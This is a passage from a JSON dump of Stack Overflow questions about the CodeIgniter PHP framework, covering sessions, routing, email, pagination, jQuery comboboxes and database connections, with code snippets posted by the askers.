application.</p>\n"},{"tags":["php","codeigniter","php-session"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":2,"view_count":99,"score":0,"question_id":12512487,"title":"CodeIgniter. Can I use PHP's native session functions and $_SESSION?","body":"<p>I've just started using CodeIgniter 2. I resisted a framework for so long but have finally realised that my mish mash collection of classes, functions, config files is a nightmare to keep updated across multiple projects.</p>\n\n<p>I was looking at CI's <a href=\"http://codeigniter.com/user_guide/libraries/sessions.html\" rel=\"nofollow\" title=\"CI's session class\">session class</a> and noticed the following:  </p>\n\n<blockquote>\n  <p>A useful aspect of the session array is that you can add your own data to it and it will be stored in the user's cookie. Why would you want to do this?</p>\n</blockquote>\n\n<p>Arrrgghh! That sounds so wrong to me for so many reasons. Here's my question...<br>\nIs it possible to use PHP's native session functions and access <code>$_SESSION</code> when using CodeIgniter?<br>\nOr is there something in CI that will prevent me from doing so? Any security features that deny direct access to super globals or something?</p>\n\n<p><a href=\"https://github.com/EllisLab/CodeIgniter/wiki/Native-session\" rel=\"nofollow\" title=\"Native sessions\">I found this</a> but it looks like it's designed for CI 1.5 and I'm not sure how updated it would be. I think I would prefer to use my own wrappers for PHP's native sessions - if I can actually use PHP's native sessions.</p>\n\n<p>I should also add that I'd prefer not to store sessions in a DB either, in case of connectivity/latency issues.</p>\n"},{"tags":["codeigniter","pagination","numbers","echo"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":499,"score":0,"question_id":9376279,"title":"How to echo page number with codeigniter pagination library?","body":"<p>I am using the codeigniter pagination library to page my search results. I am using a limit and an offset to generate the results.</p>\n\n<p>I would like to know how, apart from in the pagination links, echo the number of the page the user is currently viewing. </p>\n\n<p>For example;</p>\n\n<p>You are currently viewing page X out of Y results.</p>\n\n<p>How is this possible??</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":197,"score":0,"question_id":9311878,"title":"Code-Igniter: load & send email in a library","body":"<p>I have a library in CodeIgniter called \"someclass\".</p>\n\n<pre><code>class someclass extends CI_Controller {\n\n    function __construct() {\n        parent::__construct();\n        $this-&gt;load-&gt;helper('url');\n        $this-&gt;load-&gt;helper('form');\n        $this-&gt;load-&gt;library('email');\n        $this-&gt;load-&gt;database();\n\n       // $this-&gt;load-&gt; library('database');\n\n    }\n    function email($naar=0,$onderwerp=0,$bericht=0){\n        if ($naar &gt; 0 &amp;&amp; $naar&lt;10) {\n\n            $to = \"tester@test.com\"\n            //this is the part where it goes wrong            \n\n            $CI =&amp; get_instance();\n            $this-&gt;load-&gt;library('email');               \n            //some one said that i needed ti assign the library's\n            $this-&gt;_assign_libraries();\n\n            $this-&gt;email-&gt;from('tester@test.com', 'test');\n            $this-&gt;email-&gt;to($to);\n            $this-&gt;email-&gt;subject($onderwerp);\n            $this-&gt;email-&gt;message(\"Test\n\n                bericht :\n                \".$bericht);\n\n            $this-&gt;email-&gt;send();\n            // echo $this-&gt;email-&gt; print_debugger();\n        }\n    }\n}\n</code></pre>\n\n<p>I get the following error:</p>\n\n<pre><code>A PHP Error was encountered\n\nSeverity: Notice\n\nMessage: Undefined property: someclass::$email\n\nFilename: libraries/someclass.php\n\nLine Number: 139\n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":124,"score":0,"question_id":12070107,"title":"How to make dynamic form action address in codeigniter?","body":"<p>I have a search form on my site, and it looks like this:</p>\n\n<pre><code>&lt;form action=\"/search/results\"&gt;\n&lt;input type=\"text\" name=\"keyword\"&gt;\n&lt;button type=\"submit\"&gt;  // etc...\n&lt;/form&gt;\n</code></pre>\n\n<p>It gets me into <code>mysite.com/search/results/</code> page where I process post parameters.\nOf course, I can use the <strong>GET</strong> method, and then it will be     </p>\n\n<pre><code>/search/results?keyword=\"some_keyword\",\n</code></pre>\n\n<p>but is it possible to make the result page URL look like</p>\n\n<pre><code>mysite.com/search/results/keyword\n</code></pre>\n"},{"tags":["javascript","jquery","jquery-ui","codeigniter"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":294,"score":0,"question_id":12526337,"title":"jQuery combobox , how to trigger the select event","body":"<p>Hi i am using <code>jquery combo-box</code> for my <code>codeigniter</code> application , </p>\n\n<p>there are 3 comboboxes . when country value changes , the state  combobox again created with new values ,when state combobox value changes the city combobox created with new values .</p>\n\n<p>it works fine for the first time , but after form submit the city and state dropdown change events are not working. </p>\n\n<p>the country combobox change event works , after i change the country combobox value , again the state combo change event works .</p>\n\n<p>the problem here is , i think </p>\n\n<p>1.the state combobox events does not bind until the country combobox change .\n2.the city combobox events does not bind until the state combobox change .</p>\n\n<p>** so is there a way to trigger the country combobox select event in document ready. </p>\n\n<p>thanks in advance...........</p>\n\n<p><img src=\"http://i.stack.imgur.com/yXlNz.png\" alt=\"enter image description here\"></p>\n\n<p>this is my jquery</p>\n\n<pre><code>jQuery('#combolist_country').combobox({\n        selected: function(event, ui) {\n\n            jQuery('#combolist_state').combobox().empty();\n            jQuery('#combolist_city').combobox().empty();\n\n            dataVal = jQuery(this).val();\n\n            jQuery.ajax({\n                type :  'POST',\n                url  :  baseurl + \"/search_by_country\",\n                data: {country_id:dataVal},\n                dataType:'json',\n                success: function(data)\n                {\n                    if(data)\n                    {\n                        var data_arr=data;\n                        if(jQuery.isArray(data_arr['state_list']) &amp;&amp; data_arr['state_list'].length &gt; 0){\n                            var aList = data_arr['state_list'];\n                            var sKey;\n                            jQuery(\"#combolist_state\").combobox('destroy').empty();\n                            jQuery('#combolist_state').removeAttr('disabled');\n                            jQuery(\"#combolist_state\").append('&lt;option value=\"0\"&gt;Select State&lt;/option&gt;');           \n                            for (sKey in aList) {\n                                jQuery(\"#combolist_state\").append('&lt;option value=\"' + aList[sKey].StateID + '\"&gt;' + aList[sKey].StateName + '&lt;/option&gt;');\n                            }\n                            jQuery(\"#combolist_state\").combobox({\n                                selected:function(){\n\n                                    jQuery('#combolist_city').combobox().empty();\n                                    jQuery('#combolist_neighborhood').combobox().empty();\n\n                                    dataVal = jQuery(this).val();\n\n                                    jQuery.ajax({\n                                        type :  'POST',\n                                        url  :  baseurl + \"search_by_state\",\n                                        data: {state_id:dataVal},\n                                        dataType:\"json\",\n                                        success: function(data)\n                                        {\n                                            if(data)\n                                            {\n                                                var data_arr=data;                                  \n                                                if(jQuery.isArray(data_arr['city_list']) &amp;&amp; data_arr['city'] == 1 &amp;&amp; data_arr['city_list'].length &gt; 0){\n\n                                                    var aList = data_arr['city_list'];\n                                                    var sKey;\n                                                    jQuery(\"#combolist_city\").combobox('destroy').empty();\n                                                    jQuery('#combolist_city').removeAttr('disabled');\n                                                    jQuery(\"#combolist_city\").append('&lt;option value=\"0\"&gt;Select City&lt;/option&gt;');         \n                                                    for (sKey in aList) {\n                                                        jQuery(\"#combolist_city\").append('&lt;option value=\"' + aList[sKey].CityID + '\"&gt;' + aList[sKey].CityName + '&lt;/option&gt;');\n                                                    }  \n\n                                                    jQuery('#combowrap_combolist_city').fadeTo('slow',1);\n\n                                                }                                                   \n                                            }                                                                                       \n                                        }  \n                                    });\n                                }\n                            });  \n\n                            jQuery('#combowrap_combolist_state').fadeTo('slow',1);                          \n\n                        } \n                    } \n                }                   \n            });\n        }\n});\n</code></pre>\n"},{"tags":["php","codeigniter","content-management-system"],"answer_count":16,"favorite_count":9,"up_vote_count":19,"down_vote_count":0,"view_count":21477,"score":19,"question_id":2048179,"title":"CMS based on CodeIgniter","body":"<p>I’m looking for a CMS based on CodeIgniter. Can you suggest what CMS I could use?</p>\n\n<p>I want to learn how to build a CodeIgniter application based using a CMS as a reference.</p>\n"},{"tags":["php","json","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":87,"score":0,"question_id":12524430,"title":"PHP Json_Decode return Null","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/689185/json-decode-returns-null-after-webservice-call\">json_decode returns NULL after webservice call</a>  </p>\n</blockquote>\n\n\n\n<p><br>\nI am developing a REST service oriented App, in that on the place of login , i post the username and password it returns a json of following<br></p>\n\n<p><code>{\"id\":\"4\",\"username\":\"sam\",\"redirect\":\"clients/home\"}</code></p>\n\n<p>after that when i try to json_decode(), it showing NULL, can you tell me what is the problem\nmy server is PHP 5.2.12 and it support JSON_Decode.\n<br>\n<code>\nfunction login()<br>\n{<br>\n$result=$this->rest->request(\"http://localhost/account/users/login\",\"POST\");<br>\n$qry['result']=json_decode($result);<br>\nvar_dump($qry['result']);<br>\nforeach($qry as $result)<br>\n{<br>\n$this->session->set_userdata('id',$result->id);<br>\n$this->session->set_userdata('username',$result->username);<br>\nredirect($result->redirect);<br>\n}<br>\n}<br>\n</code></p>\n"},{"tags":["php","codeigniter","session","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":290,"score":1,"question_id":12067929,"title":"Session lose after redirect in codeigniter","body":"<p>I'm using codeigniter as a framework. The problem, Firstly, I use localhost but when I change to my ip address the login function doesn't work any more. I found that the session lost after redirect to another controller.</p>\n\n<p>Here is the result of   <code>print_r($this-&gt;session-&gt;all_userdata());</code></p>\n\n<blockquote>\n  <p>[session_id] => 7b00fa0f8790f48d24446f9eb4e6aab2 [ip_address] =>\n  10.42.68.71 [user_agent] => Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1\n  [last_activity] => 1285962398 [user_data] =></p>\n</blockquote>\n\n<p>as you can see it doesn't have any data pass to user_data but it was set before redirect when I test.</p>\n\n<p>I separate the controller to two which the first one is users -> handler of login function and another is planner which handler of the link that I redirect from users controller.</p>\n\n<p>users.php (first controller)`$this->load->model('users_model');\n            $this->load->model('mymodel');\n            $this->load->database();</p>\n\n<pre><code>        $email = $this-&gt;input-&gt;post('email');\n\n        $pass = $this-&gt;input-&gt;post('password');\n\n        $type = $this-&gt;input-&gt;post('type');\n\n        // Authenticate the user\n        $userdata = $this-&gt;users_model-&gt;auth_user($email,$pass,$type);\n\n        if($userdata)\n        {\n            $data = array('FIRSTNAME' =&gt; $userdata-&gt;FIRSTNAME, \n                                          'LASTNAME' =&gt; $userdata-&gt;LASTNAME, \n                                          'EMAIL' =&gt; $userdata-&gt;EMAIL,\n                                          'LOGIN' =&gt;TRUE, 'TYPE' =&gt; $type);\n            $this-&gt;session-&gt;set_userdata($data);\n            redirect('planner/view_system','refresh');`\n</code></pre>\n\n<p>planner.php (second controller)</p>\n\n<pre><code>function __construct() {\n    parent::__construct();\n\n\n    if ( ! ($this-&gt;session-&gt;userdata('LOGIN')))\n    { \n        print_r (var_dump($this-&gt;session-&gt;userdata('FIRSTNAME')));\n        print_r($this-&gt;session-&gt;all_userdata());\n\n    }\n    $this-&gt;load-&gt;helper(array('form','html','url'));\n    //\n</code></pre>\n\n<p>and here is my config</p>\n\n<pre><code>$config['sess_cookie_name']     = 'ci_session';\n$config['sess_expiration']      = 7200;\n$config['sess_expire_on_close'] = FALSE;\n$config['sess_encrypt_cookie']  = FALSE;\n$config['sess_use_database']    = FALSE;\n$config['sess_table_name']      = 'ci_sessions';\n$config['sess_match_ip']        = TRUE;\n$config['sess_match_useragent'] = FALSE;\n$config['sess_time_to_update']  = 300;\n</code></pre>\n"},{"tags":["php","javascript","jquery","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12523034,"title":"Loading static pages in another page based on what page the user wants to access","body":"<p>‎'requestedPageType' is a url parameter in my application. Whenever the user logs in, he is presented with the dashboard. the dashboard takes the requestedPageType value and jquery load()'s the correct view. So if 'requestedPageType=userProfile', the userProfile view in CodeIgniter will be loaded and appended using jquery. what is another way I can load individual pages into dashboard.php based off what page the user is trying to view?</p>\n\n<p>Below is an example of the code I have so far:</p>\n\n<pre><code>if ($(document).getUrlParam(\"requestedPageType\") === 'startpage') {\n    // loads the wall when the user firsts logs in\n        jQuery('#main').load('&lt;?=base_url()?&gt;index.php/routers/startpage');\n    } else if ($(document).getUrlParam('requestedPageType') === 'wall_1') {\n        var ide2 = $(document).getUrlParam(\"churchid\");\n        // loads wall_1\n        $('#main').load('&lt;?=base_url()?&gt;index.php/routers/wall_1',{id:ide2});\n        $('#logoTd').remove();\n} else if ($(document).getUrlParam(\"requestedPageType\") === 'userProfiles') {\n    // loads the wall when the user firsts logs in\n    var ide = $(document).getUrlParam(\"id\");\n        jQuery('#main').load('&lt;?=base_url()?&gt;index.php/routers/userProfiles',{id:ide});\n} else if ($(document).getUrlParam(\"requestedPageType\") === 'addEditUserInfo') {\n    var ide1 = $(document).getUrlParam(\"id\");\n    jQuery('#main').load('&lt;?=base_url()?&gt;index.php/routers/addEditUserInfo', {id:ide1});\n} if ($(document).getUrlParam(\"loggingStatus\") === 'loggedIn') {\n    $(\"#showUserBlink\").fadeIn(1000); // show and blink when user first logs in\n\n}\n</code></pre>\n"},{"tags":["php","codeigniter","netbeans","routing","netbeans-plugins"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12520886,"title":"after loading a codeigniter project into netbeans, the routes don't work","body":"<p>I already had an existing codeigniter project, but when creating a new netbeans php project and using an existing source, my routes for the codeigniter website don't work no more.</p>\n\n<p>I can tell codeigniter is still working fine, because it throws the default codeigniter 404 error page when trying to access links on my website.  </p>\n\n<p>Now i have the codeigniter plugin for netbeans installed as well.  And my codeigniter version is 2.1.2. and the latest netbeans version.</p>\n\n<p>Any reason why this might be happening?</p>\n"},{"tags":["mysql","codeigniter","activerecord","join"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":71,"score":0,"question_id":12518961,"title":"Get automatic id from join table in codeigniter (create frontend forum)","body":"<p>Table Forum as </p>\n\n<pre><code>|Forum_id|name_forum|\n|  1     |Forum 1   |\n|  2     |Forum 2   |\n</code></pre>\n\n<p>Table Thread</p>\n\n<pre><code>|thread_id|name_thread|forum_id|\n|   1     |Thread 1   |   1    |\n|   2     |Thread 2   |   1    |\n</code></pre>\n\n<p>Join 2 table</p>\n\n<pre><code>|   no   |name_forum|\n|   1    |Thread 2  |\n|   1    |Thread 2  |\n</code></pre>\n\n<p>Model</p>\n\n<pre><code>function get_forum()\n{\n    return $this-&gt;db-&gt;get('forum');\n}\n\nfunction get_thread_by_id($id)\n{\n    $this-&gt;db-&gt;select('thread.*,forum.nama_forum as forum,forum.forum_id as no');\n    $this-&gt;db-&gt;from('thread');\n    $this-&gt;db-&gt;join('forum','thread.forum_id=forum.forum_id');\n    $this-&gt;db-&gt;where('thread.forum_id',$id);\n    $this-&gt;db-&gt;order_by('thread.thread_id','desc');\n    return $this-&gt;db-&gt;get();\n}\n</code></pre>\n\n<p>Controller Forum</p>\n\n<pre><code>function index(){\n    $forums = $this-&gt;model-&gt;get_forum()-&gt;result();\n    $this-&gt;load-&gt;library('table');\n    $this-&gt;table-&gt;set_heading('No FOrum','Name Thread');\n    $foreach($forums as $forum)\n    {\n    $this-&gt;table-&gt;add_row($forum-&gt;no,\n    anchor('home/forum/view_thread/'.$forum-&gt;no,$forum-&gt;nama_forum,array('class'=&gt;'view_thread') ),);\n    }\n    $data['table']=$this-&gt;table-&gt;generate();\n    $this-&gt;load-&gt;view('show_forum',$data);\n  }\n</code></pre>\n\n<p>and</p>\n\n<pre><code>function view_thread($id){\n   $threads = $this-&gt;model-&gt;get_thread_by_id()-&gt;result();\n   $this-&gt;load-&gt;library('table');\n   $this-&gt;table-&gt;set_heading('Name_thread');\n   $foreach($threads as $thread)\n   {\n      $this-&gt;table-&gt;add_row('$thread-&gt;name_thread');\n   }\n   $data['table']=$this-&gt;table-&gt;generate();\n   $this-&gt;load-&gt;view('show_thread',$data);}\n</code></pre>\n\n<p>My question is, 'how i add thread and forum_id automatic get from forum.forum_id if i'm in 'show_view' ??? please help me</p>\n"},{"tags":["php","codeigniter","libraries"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":38,"score":0,"question_id":12518811,"title":"Using a custom library inside of a custom library in codeigniter?","body":"<p>the problem I am having is that I am trying to use a custom library inside of another custom library I made within codeigniter. They are both in the libraries folder and CodeIgniter tells me that I have to first load the instance of CI which I did...</p>\n\n<pre><code>class MyClass {\n\npublic function __construct()\n{\n    $CI =&amp; get_instance();\n    $CI-&gt;load-&gt;library(\"OtherClass\");\n}\n</code></pre>\n\n<p>Now inside of a function within this class I am trying to use my other library..</p>\n\n<pre><code>public function my_function()\n{\n      $CI-&gt;otherclass-&gt;function_inside_this_class();\n}\n</code></pre>\n\n<p>The error I am getting is</p>\n\n<pre><code>A PHP Error was encountered\nSeverity: Notice\nMessage: Undefined variable: CI\nFilename: libraries/MyClass.php\nLine Number: 20\n</code></pre>\n\n<p>Is there something I am missing in terms of declaring the codeigniter instance itself?</p>\n\n<p>Thank you!</p>\n"},{"tags":["php","html","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":5,"view_count":51,"score":-5,"question_id":12518600,"title":"What is the command for replacing strings in CodeIgniter","body":"<p>What is the command for replacing strings in CodeIgniter\nfor example</p>\n\n<p>Original string is www.example.com/imges/fraudsite.html</p>\n\n<p>Replace string is www.example.com/imges/fraudsite.zip</p>\n\n<p>just want to replace all after (dot)</p>\n\n<p>Thanks\nSodmeb</p>\n"},{"tags":["php","codeigniter","configuration","codeigniter-2"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":613,"score":0,"question_id":4871097,"title":"CodeIgniter 2.0 always redirected to welcome controller when set uri_protocol as AUTO","body":"<p>I just set up a development environment using CodeIgniter 2.0 and in config I leave the <code>uri_protocol</code> as</p>\n\n<pre><code>$config['uri_protocol'] = 'AUTO';\n</code></pre>\n\n<p>But my problem is all Controller/Action request send to the welcome controller. I checked this again by changing the <code>uri_protocol</code> to <code>QUERY_STRING</code> and it works fine for me. Why is this always redirected to welcome controller when using <code>uri_protocol</code> as <code>AUTO</code>?</p>\n"},{"tags":["css","codeigniter","url","helper"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":97,"score":0,"question_id":12518488,"title":"Code Igniter simple base url css","body":"<p>i want to connect my external css into the page. the css placed on <code>C:\\wamp\\www\\QBCI\\Style\\syle.css</code> and i am using autoload helper <code>$autoload['helper'] = array(\"html\",\"form\",\"url\");</code></p>\n\n<p>so, i write the css connector like this <code>&lt;link href=\"&lt;?php echo base_url(); ?&gt;Style/style.css\" type=\"text/css\" rel=\"stylesheet\" /&gt;</code> and now here is the view</p>\n\n<pre><code>&lt;html&gt;\n&lt;head&gt;\n    &lt;link href=\"&lt;?php echo base_url(); ?&gt;style/style.css\" type=\"text/css\" \nrel=\"stylesheet\" /&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\n    &lt;div class =\"header\"&gt;\n        http://localhost/QBCI/  //i was echoing base_url() \n    &lt;/div&gt;\n\n    &lt;div class =\"content\"&gt;\n\n\n    &lt;/div&gt;\n\n\n\n&lt;/body&gt;\n</code></pre>\n\n<p></p>\n\n<p>and finally, here is my base url at config.php\n<code>$config['base_url'] = 'http://localhost/QBCI';</code></p>\n\n<p><img src=\"http://i.stack.imgur.com/ETNfr.png\" alt=\"stucture\"></p>\n\n<p>why is the style.css is not loaded ? what did i do wrong ?</p>\n\n<p>solved, i made the css file \"syle.css\" instead of \"style.css\" sorry guys, thank you for your support </p>\n"},{"tags":["php","mysql","codeigniter","database-connection"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":154,"score":0,"question_id":12483861,"title":"Codeigniter/PHP check if can connect to database","body":"<p>I'd like to backup my read replica(i.e., slave) database with my master database but this simple boolean I did failed:</p>\n\n<pre><code>$config['hostname'] = \"myReadReplicaDatabase.com\";\n//...$config['other_stuff']; other config stuff...\n$db_obj=$CI-&gt;load-&gt;database($config, TRUE);\n\nif(!$db_obj){\n     $config['hostname'] = \"myMasterDatabase.com\";\n     $db_obj=$CI-&gt;load-&gt;database($config, TRUE);\n}\n</code></pre>\n\n<p>After terminating my read replica database I expected the boolean to evaluate to <code>FALSE</code> and the script to then use my master database. Unfortunately, instead I got the following PHP error:</p>\n\n<pre><code>Unable to connect to your database server using the provided settings.\nFilename: core/Loader.php\n</code></pre>\n\n<p>All i want is for the connection to return true or false, does anyone know how to do this in Codeigniter?</p>\n"},{"tags":["php","internet-explorer","codeigniter","pyrocms"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":169,"score":0,"question_id":10274664,"title":"Pyro CMS Admin Panel issue in Internet Explorer","body":"<p>I am trying to login the following link: </p>\n\n<p><a href=\"http://localhost/sitename/admin/\" rel=\"nofollow\">http://localhost/sitename/admin/</a> </p>\n\n<p>the login works fine in IE and other browsers. </p>\n\n<p>But the issue is if we change the URL <a href=\"http://intranetname/sitename/admin/\" rel=\"nofollow\">http://intranetname/sitename/admin/</a> (intranet name is the internal portal name) then on IE it won't let me login and just refresh the page. Login works fine on Firefox and other browsers.</p>\n\n<p>In IE if i enter wrong user password it says \"Invalid Details\" but giving the correct details it just refreshes the login page.</p>\n\n<p>Any help or suggestions are welcome.</p>\n\n<p>Thanks </p>\n"},{"tags":["php","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12517067,"title":"Add search query to URL in Codeigniter","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/12070107/how-to-make-dynamic-form-action-address-in-codeigniter\">How to make dynamic form action address in codeigniter?</a>  </p>\n</blockquote>\n\n\n\n<p>I have the following that creates a form with an input field for entering search terms. I need to be able to type the search terms into that field, and upon clicking the submit button, it needs to go to a URL in the format of <code>site.com/search/search+terms</code></p>\n\n<p>Basically, I need GET but formatted differently. How can I do this?</p>\n\n<pre><code>&lt;?php echo form_open('search', array('id' =&gt; 'site-search', 'class' =&gt; 'form-search pull-right')); ?&gt;\n    &lt;div class=\"input-append\"&gt;\n        &lt;input type=\"text\" class=\"input-medium search-query\" id=\"site-search-field\" placeholder=\"Search\"&gt;\n        &lt;button type=\"submit\" class=\"btn btn-inverse\" id=\"site-search-submit\"&gt;&lt;i class=\"icon-chevron-right icon-white\"&gt;&lt;/i&gt;&lt;/button&gt;\n    &lt;/div&gt;\n&lt;?php echo form_close(); ?&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","methods","date-diff"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":75,"score":0,"question_id":12513977,"title":"PHP date_diff method facebook style","body":"<p>i wrote a simple method which from a date start it returns how many days hours and seconds were passed.</p>\n\n<p>It returns for example 15000 days 3 hours 3 seconds ago ... seems not good to read at user side.</p>\n\n<p>How can i do better?</p>\n\n<p>For example somenthing like facebook posts time?</p>\n\n<p>can anyone take care on this code? </p>\n\n<pre><code>public function date_diff($start, $end=\"NOW\")\n    {\n        $timeshift = false;\n        $sdate = strtotime($start);\n        $edate = strtotime($end);\n\n        $time = $edate - $sdate;\n\n        if($time &gt;= 0 &amp;&amp; $time &lt;= 59) {\n                // Seconds\n              if($time == 1)\n               {\n                   $s = 'second';\n               }\n               else\n               {\n                   $s = 'seconds';\n               }\n                $timeshift = $time.\" \".$s;\n\n        } elseif($time&gt;=60 &amp;&amp; $time&lt;=3599) {\n                // Minutes + Seconds\n                $pmin = ($edate - $sdate) / 60;\n                $premin = explode('.', $pmin);\n                 if($premin[0] == 1)\n               {\n                   $m = 'min';\n               }\n               else\n               {\n                   $m = 'min';\n               }\n\n              //  $presec = $pmin-$premin[0];\n                //$sec = $presec*60;\n\n                $timeshift = $premin[0].\" \".$m;//.round($sec,0); // sec ';\n\n        } elseif($time&gt;=3600 &amp;&amp; $time&lt;=86399) {\n                // Hours + Minutes\n                $phour = ($edate - $sdate) / 3600;\n                $prehour = explode('.',$phour);\n\n                $premin = $phour-$prehour[0];\n                $min = explode('.',$premin*60);\n                 if($prehour[0] &gt; 1)\n               {\n                   $h = 'hours';\n               }\n               else\n               {\n                   $h = 'hour';\n               }\n                  if($min[0] == 1)\n               {\n                   $m = 'min';\n               }\n               else\n               {\n                   $m = 'min';\n               }\n\n           //     $presec = '0.'.$min[1];\n            //    $sec = $presec*60;\n\n                $timeshift = $prehour[0].\" \".$h.\" \".$min[0].\" \".$m;//.round($sec,0).' sec ';\n\n        } elseif($time&gt;=86400) {\n                // Days + Hours + Minutes\n                $pday = ($edate - $sdate) / 86400;\n                $preday = explode('.',$pday);\n\n                $phour = $pday-$preday[0];\n                $prehour = explode('.',$phour*24);\n\n                $premin = ($phour*24)-$prehour[0];\n                $min = explode('.',$premin*60);\n\n           //     $presec = '0.'.$min[1];\n            //    $sec = $presec*60;\n\n\n               if($preday[0] &gt; 1)\n               {\n                   $d = 'days';\n               }\n               else\n               {\n                   $d = 'day';\n               }\n               if($prehour[0] &gt; 1)\n               {\n                   $h = 'hours';\n               }\n               else\n               {\n                   $h = 'hour';\n               }\n               if($min[0] == 1)\n               {\n                   $m = 'min';\n               }\n               else\n               {\n                   $m = 'min';\n               }\n\n               $timeshift = $preday[0].\" \".$d.\" \".$prehour[0].\" \".$h.\" \".$min[0].\" \".$m;\n\n        }\n        return $timeshift.' ago';\n    }\n</code></pre>\n\n<p>thx and hope someone will enjoy this code</p>\n"},{"tags":["php","codeigniter","email"],"answer_count":4,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":110,"score":3,"question_id":12513390,"title":"Is it possible to write an email parser in PHP?","body":"<p>My PHP skills are intermediate, but I want to try to implement this:</p>\n\n<p>I have a site for local jazz musicians.  I would like them to be able to add upcoming gigs to their profile page.  I would like them to be able to send these updates in by email, like I can add tasks to my online Todo list.</p>\n\n<p>So I need to parse emails that land in my account on the server.  </p>\n\n<p>I think its fair to enforce a standard format . .and I was thinking </p>\n\n<pre><code>(In subject)NEWGIG   [[or maybe set up a separate \"newgig@mySite.com\" email account for gig updates only]]\n\nTITLE&gt;My next super gig&lt;TITLE\nDATE&gt;03/10/2012&lt;DATE\nDESC&gt;Here is some supplementary information&lt;DESC\nLINK&gt;www.hereIsTheVenue.com&lt;LINK\n</code></pre>\n\n<p>The gig would be added and a confirmation email sends out.</p>\n\n<p>How difficult is this to do?  Is it possible?  I think I can do all of the test parsing and SQL, etc .. but I don't have much experience with mail and it seems like there are a lot of \"fiddly bits\" to watch out for.</p>\n\n<p>Can anyone confirm that this is doable before I start?  Any tips or things to look out for?</p>\n\n<p>BTW - I'm doing the email parser because I want it to be super easy to use.  Musicians are notoriously lazy so if I can let them post a gig right out of their email (where they are usually getting confirmation) then it saves them the hassle of going to the site, logging in, going to their account, etc.</p>\n"},{"tags":["session","codeigniter","redirect"],"answer_count":10,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":15975,"score":1,"question_id":1703770,"title":"Code Igniter Login, Session and Redirect Problem in Internet Explorer?","body":"<p>I'm still new to code igniter and I'm having problems getting the login system to work.  </p>\n\n<p>The login always works when I use Firefox.  The login consistently works on some IE7 browsers but consistently fails on other IE7 browsers.   </p>\n\n<p>When tracing the code, I see that the models/redux_auth_model.php does successfully authenticate the user, it writes user information into the $this->session->set_userdata() and it redirect them to a member's page of my choosing.   Here's the code:</p>\n\n<pre><code>public function login($identity = false, $password = false)\n{\n            $identity_column = $this-&gt;config-&gt;item('identity');\n            $users_table     = $this-&gt;tables['users'];\n\n            if ($identity === false || $password === false || $this-&gt;identity_check($identity) == false)\n            {\n                return false;\n            }\n\n            $query = $this-&gt;db-&gt;select($identity_column.', email, password, group_id')\n                           -&gt;where($identity_column, $identity)\n                           -&gt;where('active', 'Active')\n                           -&gt;limit(1)\n                           -&gt;get($users_table);\n\n        $result = $query-&gt;row();\n\n        if ($query-&gt;num_rows() == 1)\n        {\n            //$password = $this-&gt;hash_password_db($identity, $password);\n\n           if (!empty($result-&gt;activation_code)) { return false; }\n\n                if ($result-&gt;password === $password)\n                {\n                    $this-&gt;session-&gt;set_userdata($identity_column,  $result-&gt;{$identity_column});\n                    $this-&gt;session-&gt;set_userdata('email',  $result-&gt;email);\n                    $this-&gt;session-&gt;set_userdata('group',  $result-&gt;group_id);\n                    return true;\n                }\n        }\n\n        return false;\n}\n</code></pre>\n\n<p>I did a variable dump of $this->session in both IE7 and FF and confirmed that all the userdata is intact before the redirect.  The session had my email information, group information and $identity_column information.</p>\n\n<p>However, after the redirect,  the session data is empty on some IE7 browsers, which is why CI keeps booting me out of the system. It's fully intact on other IE7 browsers and always intact in Firefox.</p>\n\n<p>Why would session data be browser dependent?</p>\n\n<p>Any ideas on how to troubleshoot this further? I am baffled...</p>\n"},{"tags":["mysql","codeigniter"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":30,"score":1,"question_id":12510689,"title":"codeigniter german characters in database","body":"<p>I have set this collation in database.php and same in database:\n$db['default']['dbcollat'] = 'latin1_german2_ci';</p>\n\n<p>When i insert a german characters it is saved in database as:</p>\n\n<pre><code>Three Burials - Die drei Begr?bnisse des Melquiades Estrada\n</code></pre>\n\n<p>But it should be:</p>\n\n<pre><code>Three Burials - Die drei Begräbnisse des Melquiades Estrada\n</code></pre>\n\n<p>my query:</p>\n\n<pre><code>$this-&gt;db-&gt;insert('table',array('title' =&gt; $this-&gt;input-&gt;post('title')));\n</code></pre>\n\n<p>How can i solve this issue? Thanks for 